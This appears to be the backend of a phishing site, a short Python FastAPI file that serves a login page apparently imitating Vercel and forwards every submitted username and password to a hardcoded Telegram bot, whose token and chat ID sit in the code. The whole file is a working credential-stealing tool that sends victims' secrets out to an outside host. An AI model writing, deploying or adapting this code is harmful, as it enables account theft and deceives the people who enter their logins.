from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
import requests

app = FastAPI()
templates = Jinja2Templates(directory="templates")

TELEGRAM_BOT_TOKEN = '7394389909:AAFAYJZEDpDCnOxwOahX5dhKOZBbrZD5S9c'
TELEGRAM_CHAT_ID = '7847742203'

def send_to_telegram(message: str):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"[错误] 无法发送Telegram消息: {e}")

@app.get("/", response_class=HTMLResponse)
def home(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/submit")
async def submit(username: str = Form(...), password: str = Form(...)):
    message = f"[Vercel 模拟记录] 用户输入：\n用户名: {username}\n密码: {password}"
    send_to_telegram(message)
    return {"status": "success", "message": "信息已提交。"}
